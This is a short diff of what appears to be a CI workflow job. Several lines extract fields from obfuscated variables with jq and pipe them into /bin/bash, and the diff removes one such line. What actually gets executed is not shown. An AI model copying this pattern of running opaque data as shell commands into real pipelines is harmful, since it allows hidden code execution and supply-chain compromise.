@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$fn986" | jq -r .ao8 | /bin/bash
           echo $g586 | jq -r .kofdy165 | /bin/bash
           printf '%s' "$q992" | jq -r .xwo134 | /bin/bash
-          echo $q78939 | jq -r .mmpo97 | /bin/bash
           echo $dy677 | jq -r .qc970 | /bin/bash
 
       - name: Archive artifact
